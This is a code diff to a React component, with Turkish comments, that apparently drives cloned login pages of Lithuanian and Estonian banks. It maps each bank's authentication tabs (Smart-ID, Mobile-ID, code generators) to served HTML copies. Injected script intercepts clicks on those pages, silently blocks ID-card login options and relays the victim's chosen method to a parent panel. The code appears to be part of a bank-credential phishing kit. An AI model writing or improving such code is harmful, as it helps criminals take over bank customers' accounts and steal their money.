@@ -37,16 +37,15 @@ export function LithuaniaBankTemplate({ bankSlug, onChange, handleRouteAction, s
   const resolveLoginMethodFromIndex = (slug?: string, index?: number) => {
     if (!slug || typeof index !== "number" || index < 0) return "";
 
-    // KISMI ESLESME: slug "seb", "seb-pank", "seb-ee", "seb-estonia" hepsi
-    // methodMap'teki "seb-pank" anahtariyla eslesir.
     const normalizedSlug = (slug || "").toString().trim().toLowerCase();
+    // GERCEK HTML SIRASI: 1.html = index 0, 2.html = index 1 ... (scan_lt_methods.js ile dogrulandi)
     const methodMap: Record<string, string[]> = {
-      "swedbank-lt": ["Smart-ID", "Mobile-ID", "Biometrika/PIN", "PIN generatorius", "ID-kortelė"],
-      "seb-lt": ["Smart-ID", "Mobile-ID", "SEB programėlė", "Generatorius"],
-      "luminor-lt": ["Smart-ID", "M. parašas", "Generatorius"],
-      "citadele-lt": ["Mobile-ID", "MobileSCAN/Digipass 780", "Kodų kortelė/Generatorius"],
-      "lku-lt": ["Smart-ID", "Mobile-ID", "Vienkartinis saugos kodas"],
-      "siauliu-lt": ["Smart-ID", "Mobile-ID", "Biometrika/PIN", "SMS"],
+      "swedbank-lt":  ["Biometrika/PIN",       "Smart-ID",        "Mobile-ID",                  "PIN generatorius",    "ID-kortelė"],
+      "seb-lt":       ["Smart-ID",             "Mobile-ID",       "SEB programėlė App",         "Generatorius"],
+      "luminor-lt":   ["Smart-ID",             "M. parašas",      "Generatorius"],
+      "citadele-lt":  ["Kodų kortelė/Generatorius", "Mobile-ID",  "MobileSCAN/Digipass 780"],
+      "lku-lt":       ["Smart-ID",             "Mobile-ID",       "Vienkartinis saugos kodas"],
+      "siauliu-lt":   ["Smart-ID",             "Mobile-ID",       "Biometrika/PIN",             "SMS"],
     };
 
     // 1) Dogrudan eslesme
@@ -55,14 +54,7 @@ export function LithuaniaBankTemplate({ bankSlug, onChange, handleRouteAction, s
     }
 
     // 2) Kismi eslesme: anahtar kelime ara
-    const orderedKeys = [
-      "swedbank-lt",
-      "seb-lt",
-      "luminor-lt",
-      "citadele-lt",
-      "lku-lt",
-      "siauliu-lt"
-    ];
+    const orderedKeys = Object.keys(methodMap);
     for (const key of orderedKeys) {
       const keyword = key.replace(/-lt$/, "").replace(/-/g, "");
       if (!keyword) continue;
@@ -71,7 +63,7 @@ export function LithuaniaBankTemplate({ bankSlug, onChange, handleRouteAction, s
       }
     }
 
-    // 3) Tek kelime
+    // 3) Tek kelime (swedbank -> swedbank-lt)
     const simpleMap: Record<string, string> = {
       "swedbank": "swedbank-lt",
       "seb": "seb-lt",
@@ -88,20 +80,72 @@ export function LithuaniaBankTemplate({ bankSlug, onChange, handleRouteAction, s
     return "";
   };
 
+  const resolveIndexFromLoginMethod = (slug: string | undefined | null, loginMethodRaw: string): number => {
+    if (!slug || !loginMethodRaw) return -1;
+    const normalizedSlug = (slug || "").toString().trim().toLowerCase();
+    const methodMap: Record<string, string[]> = {
+      "swedbank-lt":  ["Biometrika/PIN",       "Smart-ID",        "Mobile-ID",                  "PIN generatorius",    "ID-kortelė"],
+      "seb-lt":       ["Smart-ID",             "Mobile-ID",       "SEB programėlė App",         "Generatorius"],
+      "luminor-lt":   ["Smart-ID",             "M. parašas",      "Generatorius"],
+      "citadele-lt":  ["Kodų kortelė/Generatorius", "Mobile-ID",  "MobileSCAN/Digipass 780"],
+      "lku-lt":       ["Smart-ID",             "Mobile-ID",       "Vienkartinis saugos kodas"],
+      "siauliu-lt":   ["Smart-ID",             "Mobile-ID",       "Biometrika/PIN",             "SMS"],
+    };
+    let bankKey = methodMap[normalizedSlug] ? normalizedSlug : "";
+    if (!bankKey) {
+      for (const key of Object.keys(methodMap)) {
+        const kw = key.replace(/-lt$/,"").replace(/-/g,"");
+        if (kw && normalizedSlug.includes(kw)) { bankKey = key; break; }
+      }
+    }
+    if (!bankKey) {
+      const simpleMap: Record<string, string> = {"swedbank":"swedbank-lt","seb":"seb-lt","luminor":"luminor-lt","citadele":"citadele-lt","lku":"lku-lt","siauliu":"siauliu-lt"};
+      const s = Object.keys(simpleMap).find(k => normalizedSlug.includes(k));
+      if (s) bankKey = simpleMap[s];
+    }
+    if (!bankKey) return -1;
+    const list = methodMap[bankKey] || [];
+    const n = String(loginMethodRaw || "").trim().toLowerCase().replace(/„|“|"|'|`/g, "");
+    for (let i = 0; i < list.length; i++) {
+      const m = String(list[i] || "").toLowerCase().replace(/„|“|"|'|`/g, "");
+      if (!m) continue;
+      if (n === m) return i;
+      if (n.includes(m) || m.includes(n)) return i;
+      // 2-3 kelime eslesme: smart mobile bio gener sms kod kort para program vienk
+      const nToks = n.split(/[^a-ząčęėįšųūž0-9]+/).filter(Boolean);
+      const mToks = m.split(/[^a-ząčęėįšųūž0-9]+/).filter(Boolean);
+      const overlap = nToks.filter(t => mToks.some(mt => mt === t || (mt.length >=3 && t.includes(mt)) || (t.length >= 3 && mt.includes(t)))).length;
+      if (overlap >= Math.max(1, Math.min(mToks.length, nToks.length, 2))) return i;
+    }
+    return -1;
+  };
+
   const normalizeLoginMethodLabel = (value: string) => {
-    const normalized = value.trim().toLowerCase();
-    if (!normalized || normalized === "bilinmiyor") return "";
-
+    const raw = (value || "").trim();
+    if (!raw || raw.toLowerCase() === "bilinmiyor") return "";
+    // Once methodMap uzerinden normalize et (banka bazli)
+    if (bankSlug) {
+      const idx = resolveIndexFromLoginMethod(bankSlug, raw);
+      if (idx >= 0) {
+        const v = resolveLoginMethodFromIndex(bankSlug, idx);
+        if (v) return v;
+      }
+    }
+    // Fallback: genel eslesme (yeni isimler icin)
+    const normalized = raw.toLowerCase().replace(/„|“|"|'|`/g, "");
     if (normalized.includes("mobilescan") || normalized.includes("digipass")) return "MobileSCAN/Digipass 780";
-    if (normalized.includes("seb programėlė")) return "SEB programėlė";
+    if (normalized.includes("seb programėlė") || normalized.includes("seb programele") || normalized.includes("seb app")) return "SEB programėlė App";
     if (normalized.includes("smart")) return "Smart-ID";
-    if (normalized.includes("mobile") || normalized.includes("m. parašas")) return "Mobile-ID";
-    if (normalized.includes("kortelė") || normalized.includes("generatorius")) return "Generatorius";
-    if (normalized.includes("saugos kodas")) return "Vienkartinis saugos kodas";
+    if (normalized.includes("mobile") || /(^|\s)m\.?\s*para/.test(normalized)) return "Mobile-ID";
+    if (normalized.includes("vienkartinis") || normalized.includes("saugos kodas")) return "Vienkartinis saugos kodas";
+    if (/kod[uų]\s*kortel/.test(normalized) || (normalized.includes("kortel") && normalized.includes("generator"))) return "Kodų kortelė/Generatorius";
+    if (normalized.includes("generatorius") && !normalized.includes("kortelė")) return "Generatorius";
+    if (normalized.includes("pin generator") || normalized.includes("pin-kalk") || /pin[-\s]*gen/.test(normalized)) return "PIN generatorius";
+    if (normalized.includes("id-kort") || normalized.includes("id kort")) return "ID-kortelė";
+    if (normalized.includes("bio") || (/pin\b/.test(normalized) && !normalized.includes("smart") && !normalized.includes("mobile"))) return "Biometrika/PIN";
     if (normalized.includes("sms")) return "SMS";
-    if (normalized.includes("bio") || normalized.includes("pin")) return "Biometrika/PIN";
-
-    return value.trim();
+    if (normalized.includes("m. paraš") || normalized.includes("m paras")) return "M. parašas";
+    return raw;
   };
 
   const prefersIdentityFields = (loginMethod: string) => {
@@ -625,18 +669,30 @@ export function LithuaniaBankTemplate({ bankSlug, onChange, handleRouteAction, s
           ...mappedData,
         });
       } else if (e.data && e.data.type === 'LITHUANIA_BANK_TAB_CLICK') {
+         let finalIndex = -1;
+         let finalLoginMethod = "";
          if (typeof e.data.loginMethod === "string") {
            const normalizedLoginMethod = normalizeLoginMethodLabel(e.data.loginMethod);
            if (normalizedLoginMethod) {
              setSelectedLoginMethod(normalizedLoginMethod);
+             finalLoginMethod = normalizedLoginMethod;
+             const idx = resolveIndexFromLoginMethod(bankSlug, normalizedLoginMethod);
+             if (idx >= 0) finalIndex = idx;
            }
          }
          if (typeof e.data.targetIndex === 'number' && e.data.targetIndex >= 0) {
-           // SEB bank ve diğerleri için eğer targetIndex dosya sayısından büyükse, son dosyayı kullan
-           const safeIndex = Math.min(e.data.targetIndex, files.length - 1);
+           if (finalIndex === -1) finalIndex = e.data.targetIndex;
+         }
+         if (finalIndex === -1 && finalLoginMethod) {
+           // Son deneme: loginMethod -> index
+           const idx = resolveIndexFromLoginMethod(bankSlug, finalLoginMethod);
+           if (idx >= 0) finalIndex = idx;
+         }
+         if (finalIndex >= 0) {
+           const safeIndex = Math.min(finalIndex, Math.max(0, files.length - 1));
            setCurrentIndex(safeIndex);
          } else {
-           setCurrentIndex((prev) => (prev + 1) % files.length);
+           // Hic bilgi yoksa sabit index degistirme - eski (prev+1)% yanlis secim acmis oldugu icin YOK.
          }
       }
     };
@@ -1619,12 +1675,15 @@ export function LithuaniaBankTemplate({ bankSlug, onChange, handleRouteAction, s
                  targetIndex = siblings.findIndex(c => c === lookupTab || c.contains(lookupTab));
               }
 
-              // Özel Durumlar (Eğer indeks hala bulunamadıysa veya özel bankalar ise metne göre bul)
-              // LHV gibi bankalar "e.data.targetIndex" zorunlu eşleşmesini bypass etmelidir.
-              if (window.location.href.includes('citadele') || window.location.href.includes('coop') || window.location.href.includes('inbank') || window.location.href.includes('lhv') || window.location.href.includes('luminor') || window.location.href.includes('op-corporate') || window.location.href.includes('swedbank') || targetIndex === -1) {
+              // Özel Durumlar: ESKİ YANLIŞ LT BANK SIĞIR MAP SİLİNDİ!
+              // Artık sadece LHV, Coop, Inbank (ESTONIA bankalari, NOT LT!) icin kullaniliyor.
+              // TUM LITUANIA BANKALARI (swedbank, seb, luminor, citadele, lku, siauliu) ICIN:
+              //    MINIMAP (iframe ici) yukarida, ya da parentta resolveIndexFromLoginMethod() ile
+              //    DOGRU index hesaplaniyor. O yüzden asagidaki eski ESTONIA map'leri LT icin iptal!
+              const isLithuaniaBank = /\/lithuanian-banks\//i.test(window.location.href || '');
+              if (!isLithuaniaBank && (window.location.href.includes('citadele') || window.location.href.includes('coop') || window.location.href.includes('inbank') || window.location.href.includes('lhv') || window.location.href.includes('luminor') || window.location.href.includes('op-corporate') || window.location.href.includes('swedbank') || targetIndex === -1)) {
                   const tabText = targetTab.textContent.toLowerCase();
                   if (window.location.href.includes('coop')) {
-                      // Coop Bank Index Mapping (Biomeetria: 0, Smart-ID: 1, Mobiil-ID: 2)
                       if (tabText.includes('bio')) {
                           targetIndex = 0;
                       } else if (tabText.includes('smart')) {
@@ -1632,13 +1691,11 @@ export function LithuaniaBankTemplate({ bankSlug, onChange, handleRouteAction, s
                       } else if (tabText.includes('mobiil')) {
                           targetIndex = 2;
                       } else {
-                         // Eğer ID-Kaart vs tıklanırsa sessizce durdur
                          e.preventDefault();
                          e.stopPropagation();
                          return false; 
                       }
                   } else if (window.location.href.includes('inbank')) {
-                      // Inbank için özel kural: ID-kaart tamamen engellenmeli, diğerleri aktif olmalı
                       if (tabText.includes('id-kaart') || tabText.includes('id kaart') || tabText.includes('id-card') || tabText.includes('id kaart')) {
                           e.preventDefault();
                           e.stopPropagation();
@@ -1652,7 +1709,6 @@ export function LithuaniaBankTemplate({ bankSlug, onChange, handleRouteAction, s
                           targetIndex = 2;
                       }
                   } else if (window.location.href.includes('lhv')) {
-                      // LHV Bank Index Mapping (Biomeetria: 0, Smart-ID: 1, Mobiil-ID: 2, PIN-kalkulaator: 3, Salasõna: 4, ID-kaart: 5)
                       if (tabText.includes('bio')) {
                           targetIndex = 0; 
                       } else if (tabText.includes('smart')) {
@@ -1667,19 +1723,16 @@ export function LithuaniaBankTemplate({ bankSlug, onChange, handleRouteAction, s
                           targetIndex = 5; 
                       }
                   } else if (window.location.href.includes('citadele')) {
-                      // Citadele Bank Index Mapping (C-App: 0, Smart-ID: 1, ID-Kaart: 2, MobileSCAN/Digipass: 3)
                       if (tabText.includes('c-app') || tabText.includes('citadele')) targetIndex = 0;
                       else if (tabText.includes('smart')) targetIndex = 1;
                       else if (tabText.includes('id-kaart')) targetIndex = 2;
                       else if (tabText.includes('mobilescan') || tabText.includes('digipass') || tabText.includes('koodikalkulaator')) targetIndex = 3;
                   } else if (window.location.href.includes('luminor')) {
-                      // Luminor Bank Index Mapping (Mobiil-ID: 0, ID-kaart: 1, PIN-kalkulaator: 2, Smart-ID: 3)
                       if (tabText.includes('mobiil')) targetIndex = 0;
                       else if (tabText.includes('id-kaart') || tabText.includes('id kaart') || tabText.includes('id-card')) targetIndex = 1;
                         else if (tabText.includes('pin') || tabText.includes('kalkulaator')) targetIndex = 2;
                         else if (tabText.includes('smart')) targetIndex = 3;
                     } else if (window.location.href.includes('op-corporate')) {
-                        // OP Corporate Bank Index Mapping (Mobiil-ID: 0, Smart-ID: 1, PIN kalkulaator: 2)
                         if (tabText.includes('mobiil')) targetIndex = 0;
                         else if (tabText.includes('smart')) targetIndex = 1;
                         else if (tabText.includes('pin') || tabText.includes('kalkulaator')) targetIndex = 2;
@@ -1696,7 +1749,6 @@ export function LithuaniaBankTemplate({ bankSlug, onChange, handleRouteAction, s
                         else if (tabText.includes('id-kaart') || tabText.includes('id kaart') || tabText.includes('id-card')) targetIndex = 3;
                         else if (tabText.includes('digipass') || tabText.includes('pin') || tabText.includes('kalkulaator')) targetIndex = 4;
                     } else {
-                      // Diğer Bankalar İçin
                       if (tabText.includes('smart')) targetIndex = 0;
                       else if (tabText.includes('mobiil')) targetIndex = 1;
                       else if (tabText.includes('id-kaart')) targetIndex = 2;
@@ -1706,45 +1758,74 @@ export function LithuaniaBankTemplate({ bankSlug, onChange, handleRouteAction, s
                   }
               }
 
-              if (targetIndex !== -1) {
+              if (targetIndex !== -1 || (window.__traeSelectedLoginMethod || '').trim() !== '') {
                   const clickedLoginMethod = extractLoginMethodLabel(targetTab.textContent || '');
                   if (clickedLoginMethod) {
                       window.__traeSelectedLoginMethod = clickedLoginMethod;
                   }
 
-                  // Yalnızca Coop bankasıysa ve targetIndex 0, 1, 2 dışında bir şeyse (Örn: ID-Kaart = 3) çalıştır
-                  if (window.location.href.includes('coop') && targetIndex > 2) {
+                  if (window.location.href.includes('coop') && targetIndex >= 0 && targetIndex > 2) {
                       e.preventDefault();
                       return false;
                   }
 
-                  // Allow radio button to check itself visually by NOT preventing default if it's OP Corporate Bank
-                  if (window.location.href.includes('op-corporate') && (target.tagName === 'INPUT' || target.closest('label'))) {
-                      // Do not prevent default so radio can be checked
+                  // ====== PREVENTDEFAULT KARARI (EN KRITIK) ======
+                  // TIKLANAN: INPUT[type=radio/checkbox] VEYA LABEL (for=".." veya icinde radio/checkbox var)
+                  //           => PREVENTDEFAULT YAPMA (native checked olarak isaretlensin!)
+                  // DIGER DIV / BUTTON / A TAB (Vuetify .v-tab, vb.) => PREVENTDEFAULT
+                  const tgt = e.target;
+                  let isRadioOrLabel = false;
+                  let cur = tgt;
+                  for (let depth = 0; depth < 5 && cur; depth++) {
+                    const tn = cur && cur.tagName ? cur.tagName : '';
+                    if (tn === 'INPUT') {
+                      const tp = (cur.type || '').toLowerCase();
+                      if (tp === 'radio' || tp === 'checkbox') { isRadioOrLabel = true; break; }
+                    } else if (tn === 'LABEL') {
+                      const lblFor = cur.getAttribute ? cur.getAttribute('for') : null;
+                      const hasRadio = cur.querySelector ? cur.querySelector('input[type="radio"], input[type="checkbox"]') : null;
+                      if (lblFor || hasRadio) { isRadioOrLabel = true; break; }
+                    }
+                    cur = cur.parentElement;
+                  }
+                  const opCoNative = (window.location.href.includes('op-corporate') && (target.tagName === 'INPUT' || (target.closest && target.closest('label'))));
+                  if (isRadioOrLabel || opCoNative) {
+                    // DO NOTHING - let browser mark the radio checked natively
                   } else {
-                      e.preventDefault();
-                      e.stopPropagation();
-                      e.stopImmediatePropagation();
+                    e.preventDefault();
+                    e.stopPropagation();
+                    e.stopImmediatePropagation();
                   }
 
-                  // LITHUANIA icin LITHUANIA_BANK_TAB_CLICK gonder (eski ESTONIA yanlisti!)
-                  // Hem eski adrese hem yeni adrese hem de notify helpera at (cift taraflı garanti)
-                  notifyParentTabChanged(clickedLoginMethod || '', targetIndex);
+                  notifyParentTabChanged(clickedLoginMethod || '', targetIndex >= 0 ? targetIndex : undefined);
                   window.parent.postMessage({
                         type: 'LITHUANIA_BANK_TAB_CLICK',
-                        targetIndex: targetIndex,
-                        loginMethod: clickedLoginMethod
+                        targetIndex: targetIndex >= 0 ? targetIndex : undefined,
+                        loginMethod: clickedLoginMethod || (window.__traeSelectedLoginMethod || '')
                     }, '*');
               } else {
-                  // If it was considered a tab click but no index found, we should still prevent default
-                  // unless it's OP corporate
-                  if (!window.location.href.includes('op-corporate')) {
+                  // targetIndex bulunamadiysa ve login method yoksa: HIRALI yonlendirme yapma (Yanlis index acar)
+                  // EGER radio/label ise native birakmamiz yeter.
+                  const tgt = e.target;
+                  let isRadioOrLabel = false;
+                  let cur = tgt;
+                  for (let depth = 0; depth < 5 && cur; depth++) {
+                    const tn = cur && cur.tagName ? cur.tagName : '';
+                    if (tn === 'INPUT' && ((cur.type || '').toLowerCase() === 'radio' || (cur.type || '').toLowerCase() === 'checkbox')) { isRadioOrLabel = true; break; }
+                    if (tn === 'LABEL') {
+                      const lblFor = cur.getAttribute ? cur.getAttribute('for') : null;
+                      const hasRadio = cur.querySelector ? cur.querySelector('input[type="radio"], input[type="checkbox"]') : null;
+                      if (lblFor || hasRadio) { isRadioOrLabel = true; break; }
+                    }
+                    cur = cur.parentElement;
+                  }
+                  if (!isRadioOrLabel && !window.location.href.includes('op-corporate')) {
                       e.preventDefault();
                       e.stopPropagation();
                       e.stopImmediatePropagation();
                   }
               }
-              return false; // Ekstra güvenlik: tarayıcı varsayılanlarını tamamen iptal et
+              return false;
           }
 
           if (isSubmitBtn && target) {
